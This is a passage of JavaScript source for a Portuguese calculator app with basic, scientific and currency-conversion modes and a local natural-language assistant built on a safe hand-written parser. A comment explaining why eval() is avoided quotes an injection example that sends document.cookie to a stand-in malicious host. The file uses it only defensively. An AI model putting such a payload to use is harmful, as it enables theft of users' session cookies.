'use strict';

/* =============================================================================
   Calculadora Inteligente — script.js
   -----------------------------------------------------------------------------
   Nota de segurança geral (ver explicação completa na secção 2):
   Esta aplicação NUNCA usa eval(), new Function() ou qualquer mecanismo
   equivalente para calcular expressões. Todo o texto introduzido pelo
   utilizador passa por um tokenizador + parser escritos de raiz, que só
   reconhecem números, um conjunto fechado de operadores/funções, e nada
   mais — não existe caminho possível para executar código arbitrário.
   ============================================================================= */

(function () {

  /* ===========================================================================
     1. UTILITÁRIOS
     =========================================================================== */

  // Formata um número para apresentação: arredonda ruído de vírgula flutuante
  // (ex.: 0.1 + 0.2 deixa de dar 0.30000000000000004) e remove zeros supérfluos.
  function fmtNum(n) {
    if (typeof n !== 'number' || !isFinite(n)) return String(n);
    const rounded = Math.round(n * 1e10) / 1e10;
    return rounded.toString();
  }

  function capitalize(s) {
    return s.charAt(0).toUpperCase() + s.slice(1);
  }

  // Remove acentos e normaliza para minúsculas — usado apenas para RECONHECER
  // a intenção do utilizador no assistente (nunca para cálculos).
  function normalize(text) {
    return text
      .toLowerCase()
      .normalize('NFD')
      .replace(/[\u0300-\u036f]/g, '')
      .trim();
  }


  /* ===========================================================================
     2. AVALIADOR SEGURO DE EXPRESSÕES (tokenizador + parser recursivo-descendente)
     -----------------------------------------------------------------------------
     Porque não usamos eval():
     `eval(expressao)` executaria QUALQUER código JavaScript escondido dentro
     da string — não apenas contas. Uma expressão como
     "1; fetch('https://exemplo-malicioso.com/roubar?dados='+document.cookie)"
     seria interpretada por eval() como código real, com acesso total à página
     (cookies, DOM, chamadas de rede). Como o "input" aqui vem directamente do
     utilizador (ou de um botão), usar eval() abriria a porta a esse tipo de
     ataque de injecção. Em vez disso, este avaliador só entende uma gramática
     fechada — números, + - * / ^ ! ( ) , e um conjunto fixo de nomes de
     funções — pelo que qualquer coisa fora dessa gramática gera um erro
     controlado, nunca uma execução.
     =========================================================================== */

  function tokenize(input) {
    const tokens = [];
    let i = 0;
    while (i < input.length) {
      const c = input[i];

      if (c === ' ' || c === '\t' || c === '\n') { i++; continue; }

      if ((c >= '0' && c <= '9') || c === '.') {
        let start = i;
        let seenDot = false;
        while (i < input.length && ((input[i] >= '0' && input[i] <= '9') || (input[i] === '.' && !seenDot))) {
          if (input[i] === '.') seenDot = true;
          i++;
        }
        const raw = input.slice(start, i);
        if (raw === '.' || raw === '') throw new Error('Número inválido perto de "' + raw + '".');
        tokens.push({ type: 'NUMBER', value: parseFloat(raw) });
        continue;
      }

      if (/[a-zA-Z]/.test(c)) {
        let start = i;
        while (i < input.length && /[a-zA-Z]/.test(input[i])) i++;
        tokens.push({ type: 'IDENT', value: input.slice(start, i).toLowerCase() });
        continue;
      }

      if (c === '(') { tokens.push({ type: 'LPAREN', value: c }); i++; continue; }
      if (c === ')') { tokens.push({ type: 'RPAREN', value: c }); i++; continue; }
      if (c === ',') { tokens.push({ type: 'COMMA', value: c }); i++; continue; }
      if (c === '!') { tokens.push({ type: 'BANG', value: c }); i++; continue; }
      if ('+-*/^'.includes(c)) { tokens.push({ type: 'OP', value: c }); i++; continue; }

      throw new Error('Carácter não reconhecido: "' + c + '".');
    }
    return tokens;
  }

  function factorial(n) {
    if (!Number.isInteger(n) || n < 0) throw new Error('O factorial só está definido para inteiros não negativos.');
    if (n > 170) throw new Error('Esse número é grande demais para calcular o factorial.');
    let result = 1;
    for (let k = 2; k <= n; k++) result *= k;
    return result;
  }

  // Gramática (do menos ao mais prioritário):
  //   expression := term (('+'|'-') term)*
  //   term       := signed (('*'|'/') signed)*
  //   signed     := ('-'|'+')? power        <- o sinal aplica-se a toda a potência,
  //                                             para que -2^2 dê -4 (convenção matemática)
  //   power      := postfix ('^' signed)?   <- associa à direita; expoente pode ser negativo
  //   postfix    := primary ('!')*
  //   primary    := NUMBER | 'pi' | 'e' | FUNÇÃO '(' expression (',' expression)? ')' | '(' expression ')'
  class ExprParser {
    constructor(tokens, angleMode, steps) {
      this.tokens = tokens;
      this.pos = 0;
      this.angleMode = angleMode === 'RAD' ? 'RAD' : 'DEG';
      this.steps = steps || null;
    }

    peek() { return this.tokens[this.pos]; }
    next() { return this.tokens[this.pos++]; }

    expect(type, label) {
      const t = this.next();
      if (!t || t.type !== type) {
        throw new Error('Esperava ' + (label || type) + ' — verifica a expressão perto de "' +
          (t ? t.value : 'o fim') + '".');
      }
      return t;
    }

    trace(msg) { if (this.steps) this.steps.push(msg); }

    parse() {
      if (!this.tokens.length) throw new Error('Escreve uma expressão antes de calcular.');
      const value = this.parseExpression();
      if (this.pos < this.tokens.length) {
        throw new Error('Símbolo inesperado perto de "' + this.peek().value + '".');
      }
      return value;
    }

    parseExpression() {
      let value = this.parseTerm();
      while (this.peek() && this.peek().type === 'OP' && (this.peek().value === '+' || this.peek().value === '-')) {
        const op = this.next().value;
        const rhs = this.parseTerm();
        const prev = value;
        value = op === '+' ? value + rhs : value - rhs;
        this.trace(fmtNum(prev) + ' ' + op + ' ' + fmtNum(rhs) + ' = ' + fmtNum(value));
      }
      return value;
    }

    parseTerm() {
      let value = this.parseSigned();
      while (this.peek() && this.peek().type === 'OP' && (this.peek().value === '*' || this.peek().value === '/')) {
        const op = this.next().value;
        const rhs = this.parseSigned();
        const prev = value;
        if (op === '/') {
          if (rhs === 0) throw new Error('Não é possível dividir por zero.');
          value = value / rhs;
        } else {
          value = value * rhs;
        }
        this.trace(fmtNum(prev) + ' ' + (op === '*' ? '×' : '÷') + ' ' + fmtNum(rhs) + ' = ' + fmtNum(value));
      }
      return value;
    }

    parseSigned() {
      if (this.peek() && this.peek().type === 'OP' && (this.peek().value === '-' || this.peek().value === '+')) {
        const op = this.next().value;
        const value = this.parseSigned();
        return op === '-' ? -value : value;
      }
      return this.parsePower();
    }

    parsePower() {
      const value = this.parsePostfix();
      if (this.peek() && this.peek().type === 'OP' && this.peek().value === '^') {
        this.next();
        const rhs = this.parseSigned();
        const result = Math.pow(value, rhs);
        this.trace(fmtNum(value) + ' ^ ' + fmtNum(rhs) + ' = ' + fmtNum(result));
        return result;
      }
      return value;
    }

    parsePostfix() {
      let value = this.parsePrimary();
      while (this.peek() && this.peek().type === 'BANG') {
        this.next();
        const prev = value;
        value = factorial(value);
        this.trace(fmtNum(prev) + '! = ' + fmtNum(value));
      }
      return value;
    }

    parsePrimary() {
      const t = this.peek();
      if (!t) throw new Error('A expressão está incompleta.');

      if (t.type === 'NUMBER') { this.next(); return t.value; }

      if (t.type === 'LPAREN') {
        this.next();
        const value = this.parseExpression();
        this.expect('RPAREN', 'um ")"');
        return value;
      }

      if (t.type === 'IDENT') {
        this.next();
        const name = t.value;
        if (name === 'pi') return Math.PI;
        if (name === 'e') return Math.E;
        return this.parseFunctionCall(name);
      }

      throw new Error('Não reconheço "' + t.value + '" nesta posição.');
    }

    parseFunctionCall(name) {
      const KNOWN = ['sin', 'cos', 'tan', 'asin', 'acos', 'atan', 'log', 'ln', 'sqrt', 'cbrt', 'nroot'];
      if (!KNOWN.includes(name)) {
        throw new Error('Função desconhecida: "' + name + '".');
      }
      this.expect('LPAREN', 'um "(" depois de ' + name);
      const arg1 = this.parseExpression();

      if (name === 'nroot') {
        this.expect('COMMA', 'uma "," entre o número e o índice da raiz');
        const arg2 = this.parseExpression();
        this.expect('RPAREN', 'um ")"');
        if (arg2 === 0) throw new Error('O índice da raiz não pode ser zero.');
        if (arg1 < 0 && arg2 % 2 === 0) throw new Error('Não existe raiz real de índice par de um número negativo.');
        const result = Math.sign(arg1) * Math.pow(Math.abs(arg1), 1 / arg2);
        this.trace('raiz de índice ' + fmtNum(arg2) + ' de ' + fmtNum(arg1) + ' = ' + fmtNum(result));
        return result;
      }

      this.expect('RPAREN', 'um ")"');
      return this.applyFunction(name, arg1);
    }

    applyFunction(name, arg) {
      const toRad = (v) => (this.angleMode === 'DEG' ? (v * Math.PI) / 180 : v);
      const fromRad = (v) => (this.angleMode === 'DEG' ? (v * 180) / Math.PI : v);
      let result;
      switch (name) {
        case 'sin': result = Math.sin(toRad(arg)); break;
        case 'cos': result = Math.cos(toRad(arg)); break;
        case 'tan': result = Math.tan(toRad(arg)); break;
        case 'asin':
          if (arg < -1 || arg > 1) throw new Error('O arco-seno só aceita valores entre -1 e 1.');
          result = fromRad(Math.asin(arg));
          break;
        case 'acos':
          if (arg < -1 || arg > 1) throw new Error('O arco-cosseno só aceita valores entre -1 e 1.');
          result = fromRad(Math.acos(arg));
          break;
        case 'atan':
          result = fromRad(Math.atan(arg));
          break;
        case 'log':
          if (arg <= 0) throw new Error('O logaritmo só aceita valores positivos.');
          result = Math.log10(arg);
          break;
        case 'ln':
          if (arg <= 0) throw new Error('O logaritmo natural só aceita valores positivos.');
          result = Math.log(arg);
          break;
        case 'sqrt':
          if (arg < 0) throw new Error('Não é possível calcular a raiz quadrada de um número negativo.');
          result = Math.sqrt(arg);
          break;
        case 'cbrt':
          result = Math.cbrt(arg);
          break;
        default:
          throw new Error('Função desconhecida: "' + name + '".');
      }
      this.trace(name + '(' + fmtNum(arg) + ') = ' + fmtNum(result));
      return result;
    }
  }

  // Ponto de entrada público do avaliador seguro.
  function evaluateExpression(expr, angleMode, steps) {
    const tokens = tokenize(expr);
    const parser = new ExprParser(tokens, angleMode, steps);
    const result = parser.parse();
    if (Number.isNaN(result)) throw new Error('Essa operação não tem um resultado real.');
    if (!isFinite(result)) throw new Error('O resultado é grande demais para representar.');
    return result;
  }


  /* ===========================================================================
     3. CALCULADORA BÁSICA — execução imediata (estilo calculadora física)
     =========================================================================== */

  const basica = {
    display: '0',
    storedValue: null,
    pendingOp: null,
    waitingForOperand: false,
    history: [],
  };

  function basicaOpSymbol(op) {
    return { '+': '+', '-': '−', '*': '×', '/': '÷' }[op] || op;
  }

  function applyBasicOp(a, b, op) {
    switch (op) {
      case '+': return a + b;
      case '-': return a - b;
      case '*': return a * b;
      case '/':
        if (b === 0) throw new Error('Não é possível dividir por zero.');
        return a / b;
      default: throw new Error('Operador desconhecido.');
    }
  }

  function renderBasica() {
    document.getElementById('basica-value').textContent = basica.display;
  }

  function basicaInputDigit(d) {
    if (basica.waitingForOperand) {
      basica.display = d;
      basica.waitingForOperand = false;
    } else {
      basica.display = basica.display === '0' ? d : basica.display + d;
    }
    renderBasica();
  }

  function basicaInputDecimal() {
    if (basica.waitingForOperand) {
      basica.display = '0.';
      basica.waitingForOperand = false;
    } else if (!basica.display.includes('.')) {
      basica.display += '.';
    }
    renderBasica();
  }

  function basicaClear() {
    basica.display = '0';
    basica.storedValue = null;
    basica.pendingOp = null;
    basica.waitingForOperand = false;
    document.getElementById('basica-history').innerHTML = '&nbsp;';
    renderBasica();
  }

  function basicaBackspace() {
    if (basica.waitingForOperand) return;
    basica.display = basica.display.length > 1 ? basica.display.slice(0, -1) : '0';
    renderBasica();
  }

  function basicaSign() {
    if (basica.display === '0') return;
    basica.display = basica.display.startsWith('-') ? basica.display.slice(1) : '-' + basica.display;
    renderBasica();
  }

  function basicaPercent() {
    const current = parseFloat(basica.display);
    const result = (basica.storedValue !== null && basica.pendingOp)
      ? basica.storedValue * (current / 100)
      : current / 100;
    basica.display = fmtNum(result);
    renderBasica();
  }

  function basicaOperator(op) {
    const current = parseFloat(basica.display);
    if (basica.pendingOp && !basica.waitingForOperand) {
      try {
        const result = applyBasicOp(basica.storedValue, current, basica.pendingOp);
        basica.display = fmtNum(result);
        basica.storedValue = result;
      } catch (err) {
        basicaShowError(err.message);
        return;
      }
    } else {
      basica.storedValue = current;
    }
    basica.pendingOp = op;
    basica.waitingForOperand = true;
    renderBasica();
  }

  function basicaShowError(msg) {
    document.getElementById('basica-value').textContent = 'Erro';
    document.getElementById('basica-history').textContent = msg;
    basica.display = '0';
    basica.storedValue = null;
    basica.pendingOp = null;
    basica.waitingForOperand = true;
  }

  function basicaEquals() {
    if (basica.pendingOp === null || basica.storedValue === null) return;
    const current = parseFloat(basica.display);
    const label = fmtNum(basica.storedValue) + ' ' + basicaOpSymbol(basica.pendingOp) + ' ' + fmtNum(current);
    let result;
    try {
      result = applyBasicOp(basica.storedValue, current, basica.pendingOp);
    } catch (err) {
      basicaShowError(err.message);
      return;
    }
    const resultStr = fmtNum(result);
    pushBasicaHistory(label, resultStr);
    document.getElementById('basica-history').textContent = label + ' =';
    basica.display = resultStr;
    basica.storedValue = null;
    basica.pendingOp = null;
    basica.waitingForOperand = true;
    renderBasica();
    lastCalculation = { expression: label, result: resultStr, steps: [label + ' = ' + resultStr] };
  }

  function pushBasicaHistory(label, result) {
    basica.history.unshift({ label: label, result: result });
    if (basica.history.length > 8) basica.history.pop();
    const list = document.getElementById('basica-history-list');
    list.innerHTML = '';
    basica.history.forEach(function (item) {
      const li = document.createElement('li');
      const left = document.createElement('span');
      left.textContent = item.label;
      const right = document.createElement('span');
      right.textContent = '= ' + item.result;
      li.appendChild(left);
      li.appendChild(right);
      list.appendChild(li);
    });
  }

  function initBasicaKeypad() {
    document.querySelectorAll('#basica .key').forEach(function (btn) {
      btn.addEventListener('click', function () {
        if (btn.dataset.digit !== undefined) basicaInputDigit(btn.dataset.digit);
        else if (btn.dataset.action === 'decimal') basicaInputDecimal();
        else if (btn.dataset.action === 'clear') basicaClear();
        else if (btn.dataset.action === 'backspace') basicaBackspace();
        else if (btn.dataset.action === 'sign') basicaSign();
        else if (btn.dataset.action === 'percent') basicaPercent();
        else if (btn.dataset.action === 'op') basicaOperator(btn.dataset.op);
        else if (btn.dataset.action === 'equals') basicaEquals();
      });
    });
  }


  /* ===========================================================================
     4. CALCULADORA CIENTÍFICA — construção de expressão + avaliação no "="
     =========================================================================== */

  const cientifica = { expression: '', angleMode: 'DEG' };

  function prettifyExpression(expr) {
    return expr
      .replace(/\*/g, '×')
      .replace(/\//g, '÷')
      .replace(/-/g, '−')
      .replace(/sqrt\(/g, '√(')
      .replace(/cbrt\(/g, '∛(')
      .replace(/nroot\(/g, 'ʸ√(')
      .replace(/asin\(/g, 'sin⁻¹(')
      .replace(/acos\(/g, 'cos⁻¹(')
      .replace(/atan\(/g, 'tan⁻¹(')
      .replace(/\bpi\b/g, 'π');
  }

  function renderCientifica() {
    document.getElementById('cientifica-value').textContent = prettifyExpression(cientifica.expression) || '0';
  }

  function cientificaDigit(d) { cientifica.expression += d; renderCientifica(); }
  function cientificaInsert(str) { cientifica.expression += str; renderCientifica(); }
  function cientificaDecimal() { cientifica.expression += '.'; renderCientifica(); }

  function cientificaClear() {
    cientifica.expression = '';
    document.getElementById('cientifica-history').innerHTML = '&nbsp;';
    renderCientifica();
  }

  function cientificaBackspace() {
    cientifica.expression = cientifica.expression.slice(0, -1);
    renderCientifica();
  }

  function cientificaToggleMode() {
    cientifica.angleMode = cientifica.angleMode === 'DEG' ? 'RAD' : 'DEG';
    const btn = document.getElementById('deg-rad-toggle');
    btn.textContent = cientifica.angleMode;
    btn.classList.toggle('is-rad', cientifica.angleMode === 'RAD');
  }

  // Fecha parênteses em falta antes de avaliar — tolerante, como a maioria
  // das calculadoras científicas reais.
  function autoCloseParens(expr) {
    let open = 0;
    for (let i = 0; i < expr.length; i++) {
      if (expr[i] === '(') open++;
      if (expr[i] === ')') open--;
    }
    return open > 0 ? expr + ')'.repeat(open) : expr;
  }

  function cientificaEquals() {
    if (!cientifica.expression.trim()) return;
    const balanced = autoCloseParens(cientifica.expression);
    const steps = [];
    try {
      const result = evaluateExpression(balanced, cientifica.angleMode, steps);
      const resultStr = fmtNum(result);
      document.getElementById('cientifica-history').textContent = prettifyExpression(balanced) + ' =';
      cientifica.expression = resultStr;
      lastCalculation = {
        expression: prettifyExpression(balanced),
        result: resultStr,
        steps: steps.length ? steps : [prettifyExpression(balanced) + ' = ' + resultStr],
      };
      renderCientifica();
    } catch (err) {
      document.getElementById('cientifica-value').textContent = 'Erro';
      document.getElementById('cientifica-history').textContent = err.message;
    }
  }

  function initCientificaKeypad() {
    document.querySelectorAll('#cientifica .key').forEach(function (btn) {
      btn.addEventListener('click', function () {
        if (btn.dataset.digit !== undefined) cientificaDigit(btn.dataset.digit);
        else if (btn.dataset.insert !== undefined) cientificaInsert(btn.dataset.insert);
        else if (btn.dataset.action === 'decimal') cientificaDecimal();
        else if (btn.dataset.action === 'clear') cientificaClear();
        else if (btn.dataset.action === 'backspace') cientificaBackspace();
        else if (btn.dataset.action === 'op') cientificaInsert(btn.dataset.op);
        else if (btn.dataset.action === 'equals') cientificaEquals();
      });
    });
    document.getElementById('deg-rad-toggle').addEventListener('click', cientificaToggleMode);
  }


  /* ===========================================================================
     5. CONVERSOR DE MOEDAS
     -----------------------------------------------------------------------------
     Usa a Frankfurter API (api.frankfurter.dev): gratuita, sem chave e sem
     registo — pelo que não há NENHUMA credencial para proteger ou esconder
     no código do lado do cliente. Se o pedido falhar (sem ligação, API em
     baixo, etc.), a aplicação recorre a FALLBACK_RATES — valores fixos de
     exemplo, claramente assinalados como não actualizados na interface.
     =========================================================================== */

  const CURRENCIES = [
    { code: 'USD', name: 'Dólar americano' },
    { code: 'EUR', name: 'Euro' },
    { code: 'GBP', name: 'Libra esterlina' },
    { code: 'BRL', name: 'Real brasileiro' },
    { code: 'AOA', name: 'Kwanza angolano' },
    { code: 'ZAR', name: 'Rand sul-africano' },
    { code: 'CNY', name: 'Yuan chinês' },
    { code: 'JPY', name: 'Iene japonês' },
    { code: 'CAD', name: 'Dólar canadiano' },
    { code: 'CHF', name: 'Franco suíço' },
  ];

  // Valores aproximados de exemplo (base: 1 USD). NÃO reflectem o câmbio
  // actual — servem apenas de recurso caso a API não esteja acessível.
  const FALLBACK_RATES = {
    USD: 1, EUR: 0.92, GBP: 0.79, BRL: 5.4, AOA: 830,
    ZAR: 18.4, CNY: 7.1, JPY: 147, CAD: 1.36, CHF: 0.81,
  };

  const currency = { rates: null, isStale: true };

  function populateCurrencySelects() {
    const fromSel = document.getElementById('currency-from');
    const toSel = document.getElementById('currency-to');
    CURRENCIES.forEach(function (c) {
      const label = c.code + ' — ' + c.name;
      const opt1 = document.createElement('option');
      opt1.value = c.code; opt1.textContent = label;
      fromSel.appendChild(opt1);
      const opt2 = document.createElement('option');
      opt2.value = c.code; opt2.textContent = label;
      toSel.appendChild(opt2);
    });
    fromSel.value = 'USD';
    toSel.value = 'AOA';
  }

  function convertCurrency() {
    if (!currency.rates) return;
    const amount = parseFloat(document.getElementById('currency-amount').value.replace(',', '.'));
    const from = document.getElementById('currency-from').value;
    const to = document.getElementById('currency-to').value;
    const resultEl = document.getElementById('currency-result');
    if (isNaN(amount)) { resultEl.textContent = '—'; return; }
    const result = amount * (currency.rates[to] / currency.rates[from]);
    resultEl.textContent = result.toLocaleString('pt-PT', { maximumFractionDigits: 4 });
  }

  function swapCurrencies() {
    const fromSel = document.getElementById('currency-from');
    const toSel = document.getElementById('currency-to');
    const tmp = fromSel.value;
    fromSel.value = toSel.value;
    toSel.value = tmp;
    convertCurrency();
  }

  function setRefreshLoading(loading) {
    const btn = document.getElementById('currency-refresh');
    const label = document.getElementById('currency-refresh-label');
    if (!btn) return;
    btn.disabled = loading;
    btn.classList.toggle('is-loading', loading);
    label.textContent = loading ? 'A actualizar…' : 'Actualizar taxas';
  }

  function fetchRates() {
    const note = document.getElementById('currency-rate-note');
    setRefreshLoading(true);
    note.textContent = 'A obter taxas de câmbio…';
    note.classList.remove('is-stale');
    const targets = CURRENCIES.filter(function (c) { return c.code !== 'USD'; })
      .map(function (c) { return c.code; }).join(',');

    fetch('https://api.frankfurter.dev/v2/rates?base=USD&quotes=' + targets)
      .then(function (res) {
        if (!res.ok) throw new Error('Resposta inválida da API de câmbio.');
        return res.json();
      })
      .then(function (data) {
        // A API v2 devolve uma lista: [{ date, base, quote, rate }, ...]
        if (!Array.isArray(data) || !data.length) throw new Error('Formato de resposta inesperado.');
        const fetched = { USD: 1 };
        data.forEach(function (row) {
          if (row && row.quote && typeof row.rate === 'number') fetched[row.quote] = row.rate;
        });
        currency.rates = fetched;
        currency.isStale = false;
        const rateDate = data[0] && data[0].date;
        note.textContent = 'Taxas actualizadas' + (rateDate ? ' (' + rateDate + ')' : '') + ' — fonte: Frankfurter API.';
        note.classList.remove('is-stale');
        convertCurrency();
      })
      .catch(function () {
        // Se já havia taxas reais de uma actualização anterior, mantém-nas em vez
        // de as trocar pelos valores de exemplo.
        if (currency.rates && !currency.isStale) {
          note.textContent = '⚠ Não foi possível actualizar agora — a manter as últimas taxas obtidas.';
          note.classList.add('is-stale');
        } else {
          currency.rates = FALLBACK_RATES;
          currency.isStale = true;
          note.textContent = '⚠ Sem ligação à API de câmbio — a usar valores de exemplo, não actualizados.';
          note.classList.add('is-stale');
        }
        convertCurrency();
      })
      .then(function () { setRefreshLoading(false); });
  }

  function initCurrency() {
    populateCurrencySelects();
    document.getElementById('currency-amount').addEventListener('input', convertCurrency);
    document.getElementById('currency-from').addEventListener('change', convertCurrency);
    document.getElementById('currency-to').addEventListener('change', convertCurrency);
    document.getElementById('currency-swap').addEventListener('click', swapCurrencies);
    document.getElementById('currency-refresh').addEventListener('click', fetchRates);
    fetchRates();
  }


  /* ===========================================================================
     6. ASSISTENTE — interpretação de linguagem natural (100% local)
     -----------------------------------------------------------------------------
     Por escolha do utilizador, este assistente NÃO liga a nenhum serviço de
     IA externo: interpreta o pedido localmente através de padrões de texto
     (regex + palavras-chave em português) e devolve sempre o cálculo
     realizado pelo MESMO avaliador seguro da secção 2 — nunca inventa um
     resultado, apenas interpreta a intenção e delega a conta.
     =========================================================================== */

  let lastCalculation = null; // { expression, result, steps } — para pedidos de explicação

  // Números escritos à portuguesa: "15.000" usa o ponto como separador de
  // milhares (quinze mil, não quinze vírgula zero), e "15,5" usa a vírgula
  // como separador decimal. NUM_RE reconhece as duas formas; parsePtNumber()
  // interpreta o texto capturado correctamente em vez de usar parseFloat()
  // directamente, que leria "15.000" como 15.
  const NUM_RE = '(?:\\d{1,3}(?:[.,]\\d{3})+(?:[.,]\\d+)?|\\d+(?:[.,]\\d+)?)';

  function parsePtNumber(str) {
    str = String(str).trim();
    const hasDot = str.indexOf('.') !== -1;
    const hasComma = str.indexOf(',') !== -1;

    if (hasDot && hasComma) {
      // O separador que aparece por último é o decimal; o outro é de milhares.
      if (str.lastIndexOf(',') > str.lastIndexOf('.')) {
        return parseFloat(str.replace(/\./g, '').replace(',', '.'));
      }
      return parseFloat(str.replace(/,/g, ''));
    }
    if (hasDot) {
      const parts = str.split('.');
      const groups = parts.slice(1);
      const isThousands = groups.length >= 1 && groups.every(function (g) { return g.length === 3; });
      return isThousands ? parseFloat(parts.join('')) : parseFloat(str);
    }
    if (hasComma) return parseFloat(str.replace(',', '.'));
    return parseFloat(str);
  }

  const CURRENCY_KEYWORDS = [
    [['dolar canadiano', 'dolares canadianos'], 'CAD'],
    [['franco suico', 'francos suicos'], 'CHF'],
    [['libra esterlina', 'libras esterlinas'], 'GBP'],
    [['yuan chines', 'yuans chineses'], 'CNY'],
    [['iene japones', 'ienes japoneses'], 'JPY'],
    [['dolares', 'dolar', 'usd'], 'USD'],
    [['euros', 'euro', 'eur'], 'EUR'],
    [['libras', 'libra', 'gbp'], 'GBP'],
    [['reais', 'real', 'brl'], 'BRL'],
    [['kwanzas', 'kwanza', 'aoa'], 'AOA'],
    [['rands', 'rand', 'zar'], 'ZAR'],
    [['yuans', 'yuan', 'cny'], 'CNY'],
    [['ienes', 'iene', 'jpy'], 'JPY'],
    [['francos', 'franco', 'chf'], 'CHF'],
    [['cad'], 'CAD'],
  ];

  function findCurrencyMentions(norm) {
    const claimed = [];
    const found = [];
    CURRENCY_KEYWORDS.forEach(function (group) {
      const variants = group[0], code = group[1];
      variants.forEach(function (variant) {
        const idx = norm.indexOf(variant);
        if (idx === -1) return;
        const end = idx + variant.length;
        const overlaps = claimed.some(function (c) { return idx < c.end && end > c.start; });
        if (overlaps) return;
        claimed.push({ start: idx, end: end });
        found.push({ idx: idx, code: code });
      });
    });
    found.sort(function (a, b) { return a.idx - b.idx; });
    return found.map(function (f) { return f.code; });
  }

  function handleConversion(amount, fromCode, toCode) {
    if (!currency.rates) {
      return { text: 'Ainda estou a carregar as taxas de câmbio — tenta novamente daqui a um instante.' };
    }
    const rate = currency.rates[toCode] / currency.rates[fromCode];
    const result = amount * rate;
    const resultStr = result.toLocaleString('pt-PT', { maximumFractionDigits: 4 });
    const staleNote = currency.isStale ? ' (valores de exemplo, não actualizados)' : '';
    lastCalculation = {
      expression: fmtNum(amount) + ' ' + fromCode + ' → ' + toCode,
      result: resultStr + ' ' + toCode,
      steps: [
        '1 ' + fromCode + ' = ' + rate.toFixed(6) + ' ' + toCode,
        fmtNum(amount) + ' × ' + rate.toFixed(6) + ' = ' + resultStr + ' ' + toCode,
      ],
    };
    return { text: fmtNum(amount) + ' ' + fromCode + ' são aproximadamente ' + resultStr + ' ' + toCode + staleNote + '.' };
  }

  function handlePercentOf(pct, base, currencyCode) {
    const result = (pct / 100) * base;
    const resultStr = fmtNum(result);
    const unit = currencyCode ? ' ' + currencyCode : '';
    lastCalculation = {
      expression: fmtNum(pct) + '% de ' + fmtNum(base) + unit,
      result: resultStr + unit,
      steps: [
        fmtNum(pct) + '% de ' + fmtNum(base) + unit + ' = (' + fmtNum(pct) + ' ÷ 100) × ' + fmtNum(base),
        '= ' + fmtNum(pct / 100) + ' × ' + fmtNum(base) + ' = ' + resultStr + unit,
      ],
    };
    return { text: fmtNum(pct) + '% de ' + fmtNum(base) + unit + ' é ' + resultStr + unit + '.' };
  }

  function evalAndReply(expr, label) {
    const steps = [];
    try {
      const result = evaluateExpression(expr, cientifica.angleMode, steps);
      const resultStr = fmtNum(result);
      lastCalculation = { expression: label, result: resultStr, steps: steps.length ? steps : [label + ' = ' + resultStr] };
      return { text: capitalize(label) + ' é ' + resultStr + '.' };
    } catch (err) {
      return { text: 'Não consegui calcular isso: ' + err.message };
    }
  }

  function tryNamedFunctionPatterns(norm) {
    const num = '(' + NUM_RE + ')';
    const simple = [
      { re: new RegExp('raiz quadrada de ' + num), fn: 'sqrt', label: 'raiz quadrada' },
      { re: new RegExp('raiz cubica de ' + num), fn: 'cbrt', label: 'raiz cúbica' },
      { re: new RegExp('seno de ' + num), fn: 'sin', label: 'seno' },
      { re: new RegExp('cosseno de ' + num), fn: 'cos', label: 'cosseno' },
      { re: new RegExp('tangente de ' + num), fn: 'tan', label: 'tangente' },
      { re: new RegExp('logaritmo natural de ' + num), fn: 'ln', label: 'logaritmo natural' },
      { re: new RegExp('\\bln de ' + num), fn: 'ln', label: 'logaritmo natural' },
      { re: new RegExp('logaritmo de ' + num), fn: 'log', label: 'logaritmo' },
      { re: new RegExp('factorial de ' + num), fn: 'fact', label: 'factorial' },
    ];
    for (let i = 0; i < simple.length; i++) {
      const m = norm.match(simple[i].re);
      if (m) {
        const value = parsePtNumber(m[1]);
        const expr = simple[i].fn === 'fact' ? (value + '!') : (simple[i].fn + '(' + value + ')');
        const label = simple[i].label + ' de ' + fmtNum(value);
        const reply = evalAndReply(expr, label);
        if (lastCalculation && (simple[i].fn === 'sin' || simple[i].fn === 'cos' || simple[i].fn === 'tan')) {
          reply.text = reply.text.replace(/\.$/, '') + ' (modo ' + cientifica.angleMode + ').';
        }
        return reply;
      }
    }

    let m = norm.match(new RegExp(num + '\\s*ao quadrado'));
    if (m) return evalAndReply(parsePtNumber(m[1]) + '^2', fmtNum(parsePtNumber(m[1])) + ' ao quadrado');

    m = norm.match(new RegExp(num + '\\s*ao cubo'));
    if (m) return evalAndReply(parsePtNumber(m[1]) + '^3', fmtNum(parsePtNumber(m[1])) + ' ao cubo');

    m = norm.match(new RegExp(num + '\\s*elevado a\\s*' + num));
    if (m) return evalAndReply(parsePtNumber(m[1]) + '^' + parsePtNumber(m[2]), fmtNum(parsePtNumber(m[1])) + ' elevado a ' + fmtNum(parsePtNumber(m[2])));

    return null;
  }

  // Problemas de idade/datas — ex.: "nasci em 2009, quantos anos tenho?" ou
  // "diferença entre 1998 e 2026". Sem o dia/mês de nascimento só é possível
  // dar a idade que a pessoa faz nesse ano, por isso a resposta assinala as
  // duas hipóteses (já fez anos / ainda não fez).
  function tryDateMathPatterns(norm) {
    const birthMatch = norm.match(/nasc\w*\s+em\s+(\d{4})/);
    if (birthMatch) {
      const birthYear = parseInt(birthMatch[1], 10);
      const currentYearMatch = norm.match(/(?:actualmente|atualmente|agora|hoje|ano)[^\d]{0,15}(\d{4})/);
      const currentYear = currentYearMatch ? parseInt(currentYearMatch[1], 10) : new Date().getFullYear();
      const age = currentYear - birthYear;
      if (age < 0 || age > 130) {
        return { text: 'Esses anos não parecem bater certo — confirma o ano de nascimento e o ano actual.' };
      }
      lastCalculation = {
        expression: currentYear + ' − ' + birthYear,
        result: age + ' anos',
        steps: [
          currentYear + ' − ' + birthYear + ' = ' + age,
          'Essa é a idade que se faz em ' + currentYear + '; se o aniversário ainda não tiver passado esse ano, ainda são ' + (age - 1) + '.',
        ],
      };
      return { text: 'Em ' + currentYear + ' fazes ' + age + ' anos (ou ainda tens ' + (age - 1) + ', se o aniversário ainda não tiver passado).' };
    }

    const betweenMatch = norm.match(/entre\s+(\d{4})\s+e\s+(\d{4})/);
    if (betweenMatch && /ano|diferen/.test(norm)) {
      const y1 = parseInt(betweenMatch[1], 10);
      const y2 = parseInt(betweenMatch[2], 10);
      const diff = Math.abs(y2 - y1);
      lastCalculation = {
        expression: Math.max(y1, y2) + ' − ' + Math.min(y1, y2),
        result: diff + ' anos',
        steps: [Math.max(y1, y2) + ' − ' + Math.min(y1, y2) + ' = ' + diff],
      };
      return { text: 'Entre ' + y1 + ' e ' + y2 + ' vão ' + diff + ' anos.' };
    }

    return null;
  }

  // Variações percentuais em linguagem natural — ex.: "aumenta 200 em 15%".
